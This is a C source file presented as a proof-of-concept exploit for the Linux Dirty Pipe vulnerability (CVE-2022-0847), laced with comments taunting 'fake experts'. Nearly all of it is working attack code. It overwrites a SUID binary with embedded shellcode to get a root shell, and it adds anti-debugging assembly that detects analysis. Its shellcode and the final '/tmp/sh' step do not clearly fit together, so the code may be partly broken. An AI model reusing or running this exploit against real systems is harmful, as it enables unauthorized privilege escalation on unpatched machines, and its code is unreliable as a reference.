

// Some arrogant experts advised me to learn the basics. What do you think now, fake expert?
// From Python to hacking your system's kernel, guess who's the expert now?
// It turns out the problem wasn't the language, it was your way of thinking

/*
 * Filename     : dirtypipe.c
 * Author       : Byte Reaper
 * CVE          : CVE-2022-0847 ("Dirty Pipe")
 * Description  :
 *   Proof-of-Concept exploit for the Dirty Pipe vulnerability affecting Linux
 *   kernel versions 5.8 through 5.16. This exploit allows local privilege
 *   escalation by modifying read-only files (e.g., SUID binaries) due to
 *   improper handling of pipe buffer flags.
 *
 *   The code implements the following steps:
 *     1. Verifies that the running kernel version is within the vulnerable range.
 *     2. Prepares and fills/drains a pipe to set up the exploit (crPipe).
 *     3. Uses splice() to shift file data and then writes custom ELF shellcode
 *        into the target SUID binary (exP).
 *     4. Executes the hijacked binary to spawn a temporary root shell.
 *     5. Restores the original binary contents and finally launches a persistent
 *        root shell.
 *
 * Usage:
 *     gcc dirtypipe.c -Wall -O2 -fno-pie -no-pie -o dirtypipe
 *     ./dirtypipe /path/to/suid_binary
 *
 * Warning:
 *   This code is intended strictly for educational and research purposes.
 *   Running it on systems without explicit permission is illegal and unethical.
 *
 * References:
 *   - Dirty Pipe official site: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE 
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>     
#include <sys/stat.h>
#include <sys/utsname.h>

#define BUFFER_SIZE 4096

unsigned char elfcode[] = {
    0x7f, 'E', 'L', 'F',
    0x02, 0x01, 0x01, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x02, 0x00,
    0x3e, 0x00,
    0x01, 0x00, 0x00, 0x00,
    0x78, 0x00, 0x40, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00,
    0x34, 0x00,
    0x00, 0x00,
    0x48, 0x31, 0xFF,
    0x48, 0x31, 0xF6,
    0x48, 0x31, 0xD2,
    0x68, 0x2F, 0x2F, 0x73, 0x68,
    0x68, 0x2F, 0x62, 0x69, 0x6E,
    0x48, 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x05,
    0x48, 0x31, 0xFF,
    0x48, 0x31, 0xF6,
    0x48, 0x31, 0xD2,
    0x48, 0xB8, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0x05
};

int check_suid(const char* path)
{
    struct stat st;
    if (stat(path, &st) == 0 && (st.st_mode & S_ISUID)) {
        printf("[+] The file has SUID permissions and is ready for exploitation\n");
        return 1;
    }
    else {
        fprintf(stderr, "[-] %s is not a SUID regular file\n", path);
        return 0;
    }
}

void check_kernelVersion(void)
{
    struct utsname utsname;
    if (uname(&utsname) < 0)
    {
        perror("[-]...");
        exit(EXIT_FAILURE);
    }
    int numberVersion1, numberVersion2;
    if (sscanf(utsname.release, "%d.%d",
        &numberVersion1,
        &numberVersion2) != 2)
    {
        fprintf(stderr, "[-]  Failed to retrieve kernel version: %s\n",
            utsname.release);
        exit(EXIT_FAILURE);
    }
    if (numberVersion1 != 5 || numberVersion2 < 8 || numberVersion2 > 16)
    {
        fprintf(stderr, "[-] kernel %d.%d is not vulnerable to Dirty Pipe (version must be between 5.8 and 5.16)s\n",
            numberVersion1,
            numberVersion2);
        exit(EXIT_FAILURE);
    }
    else
    {
        printf("[+] The kernel %d.%d is within the vulnerable range\n",
            numberVersion1,
            numberVersion2);
    }

}

void crPipe(int p[2])
{
    // Create a pipe with two file descriptors: p[0] for reading, p[1] for writing
    if (pipe(p) == -1) {
        perror("[-] Failed to create pipe");
        exit(EXIT_FAILURE);
    }

    // Get the maximum size (capacity) of the pipe buffer
    const unsigned pipeSize = fcntl(p[1],
        F_GETPIPE_SZ);
    if (pipeSize == (unsigned)-1)
    {
        perror("[-] Error getting pipe size (fcntl)");
        exit(EXIT_FAILURE);
    }

    // A static buffer used to fill the pipe in chunks
    static char buff[BUFFER_SIZE];
    // Fill the pipe completely
    // This ensures that all pipe_buffer structs inside the kernel have the flag
    // PIPE_BUF_FLAG_CAN_MERGE set, which is essential for the Dirty Pipe exploit
    for (unsigned remaining = pipeSize; remaining > 0;)
    {
        unsigned chunk = remaining > sizeof(buff) ? sizeof(buff) : remaining;
        ssize_t written = write(p[1],
            buff,
            chunk);
        if (written <= 0) {
            perror("[-] Error writing to pipe");
            exit(EXIT_FAILURE);
        }
        remaining -= written;
    }
    // Drain (empty) the pipe completely
    // This frees the pipe_buffer instances but leaves their flags intact,
    // keeping PIPE_BUF_FLAG_CAN_MERGE active for future writes
    for (unsigned remaining = pipeSize; remaining > 0;)
    {
        unsigned chunk = remaining > sizeof(buff) ? sizeof(buff) : remaining;
        ssize_t read_bytes = read(p[0],
            buff,
            chunk);
        if (read_bytes <= 0) {
            perror("[-] Failed to read from pipe");
            exit(EXIT_FAILURE);
        }
        remaining -= read_bytes;
    }
}

int exP(const char* file_path, long target_offset, const uint8_t* payload, size_t payload_size) {
    int file_descriptor = open(file_path,
        O_RDONLY); // Open the file in read-only mode
    if (file_descriptor < 0) {
        perror("[-] Failed to open file");
        return -1;
    }
    struct stat file_stats;
    if (fstat(file_descriptor, &file_stats) < 0) {
        perror("[-] Failed to get file stats");
        close(file_descriptor);
        return -1;
    }
    // Create a pipe to exploit the Dirty Pipe vulnerability
    int pipe_fds[2];
    crPipe(pipe_fds);

    // Step 1: Splice the data from the file at the target offset, shifting by 1 byte
    --target_offset;
    ssize_t bytes_spliced = splice(file_descriptor,
        &target_offset,
        pipe_fds[1],
        NULL,
        1,
        0);

    if (bytes_spliced < 0) {
        perror("[-] Failed to splice data");
        close(file_descriptor);
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }
    if (bytes_spliced == 0) {
        fprintf(stderr,
            "[-] Splice operation returned zero bytes\n");
        close(file_descriptor);
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }

    // Step 2: Write the payload into the pipe — this will overwrite the data due to the Dirty Pipe vulnerability
    ssize_t bytes_written = write(pipe_fds[1],
        payload,
        payload_size);
    if (bytes_written < 0) {
        perror("[-] Error occurred while writing payload to the pipe");
        close(file_descriptor);
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }
    if ((size_t)bytes_written < payload_size) {
        fprintf(stderr,
            "[-] Not enough bytes written: expected %zu, got %zd\n",
            payload_size,
            bytes_written);
        close(file_descriptor);
        close(pipe_fds[0]);
        close(pipe_fds[1]);
        return -1;
    }

    // Cleanup: Close the file descriptor
    close(file_descriptor);
    close(pipe_fds[0]);
    close(pipe_fds[1]);

    return 0;
}

#define MSG_LEN (sizeof(message)-1)
const char filename[] = "/proc/self/status";
const char message[] = "[-] You again? What is this, your first reverse? Try harder.\n";
const int msg_len = sizeof(message) - 1;

// Since you're such an expert, I figured you'd appreciate this masterpiece

void anti_arrogance() {
    __asm__ __volatile__(
        /* Step 1: ptrace(PTRACE_TRACEME) to detect debugger */
        "movq $101, %%rax\n\t"
        "movq $0,   %%rdi\n\t"   // PTRACE_TRACEME (spoiler: you lose)
        "xorq %%rsi, %%rsi\n\t"
        "xorq %%rdx, %%rdx\n\t"
        "syscall\n\t"
        "cmpq $-1, %%rax\n\t"  // Debugger detected if -1
        "je   fail\n\t"         // You triggered it, rookie

        // --- Step 2: GDB sniffer ---
        // Check /proc/self/status like a boss 
        "movq $257, %%rax\n\t"       // openat syscall
        "movq $-100, %%rdi\n\t"        // AT_FDCWD
        "leaq filename(%%rip), %%rsi\n\t" // "/proc/self/status"
        "movq $0,     %%rdx\n\t"         // O_RDONLY
        "syscall\n\t"
        "cmpq $3,     %%rax\n\t"        // If less than 3, nahhh... denied.
        "jl   fail\n\t"
        // --- Clean exit, you’re clear ---
        "jmp  done\n\t"

        // --- Caught ya! Time to flex --
        "fail:\n\t"

        "movq $1,   %%rax\n\t"
        "movq $1,   %%rdi\n\t"
        "leaq message(%%rip), %%rsi\n\t"
        "movq %[len], %%rdx\n\t"
        "syscall\n\t"
        // Exit peacefully, you've embarrassed yourself enough
        "movq $60,  %%rax\n\t"
        "xorq %%rdi, %%rdi\n\t"
        "syscall\n\t"

        "done:\n\t"
        :
    : [len] "r" ((long)MSG_LEN)
        : "rax", "rdi", "rsi", "rdx"
        );
}


int main(int argc, char** argv) {
    check_kernelVersion();
    anti_arrogance();    //Don't forget to deactivate it if you're done with the illusion that you're talking about, expert, hahaha.
    if (argc != 2) {
        fprintf(stderr, "[-] Usage: %s <Path to SUID Binary>\n", argv[0]);
        return EXIT_FAILURE;
    }
    char* path = argv[1];
    if (!check_suid(path)) {
        return EXIT_FAILURE;
    }
    // Open the SUID binary
    int file = open(path, O_RDONLY);
    if (file < 0) {
        perror("[-] Error opening file");
        return EXIT_FAILURE;
    }

    // Allocate memory for the original bytes of the binary
    uint8_t* orig_bytes = malloc(sizeof(elfcode));
    if (!orig_bytes) {
        perror("[-] Failed to allocate memory");
        close(file);
        return EXIT_FAILURE; 
    }

    // Read original bytes from the file
    if (lseek(file, 1, SEEK_SET) == -1) {
        perror("[-] Error seeking in file");
        free(orig_bytes);
        close(file);
        return EXIT_FAILURE;
    }

    if (read(file, orig_bytes, sizeof(elfcode)) == -1) {
        perror("[-] File read operation failed");
        free(orig_bytes);
        close(file);
        return EXIT_FAILURE;
    }

    close(file);

    // Step 1: Hijack the SUID binary
    printf("[+] Initiating SUID binary hijack...\n");
    if (exP(path, 1, elfcode, sizeof(elfcode)) != 0) {
        printf("[-] Binary hijack attempt unsuccessful.\n");
        free(orig_bytes);
        return EXIT_FAILURE;
    }

    // Step 2: Drop the SUID shell and execute it
    printf("[+] Deploying temporary SUID shell...\n");
    if (system(path) != 0) {
        printf("[-] Execution of the SUID binary failed.\n");
        free(orig_bytes);
        return EXIT_FAILURE;
    }

    // Step 3: Restore the original SUID binary
    printf("[+] Restoring original SUID binary to its original state...\n");
    if (exP(path, 1, orig_bytes, sizeof(elfcode)) != 0) {
        fprintf(stderr, "[-] Error: Failed to restore the original SUID binary to its original state.\n");
        free(orig_bytes);
        return EXIT_FAILURE;
    }
    // Step 4: Pop the root shell
    printf("[+] Launching root shell... Please remember to remove /tmp/sh after use.\n");
    if (system("/tmp/sh") != 0) {
        fprintf(stderr, "[-] Failed to launch root shell — make sure /tmp/sh exists and is executable.\n");
        free(orig_bytes);
        return EXIT_FAILURE;
    }
    free(orig_bytes);
    return EXIT_SUCCESS;
}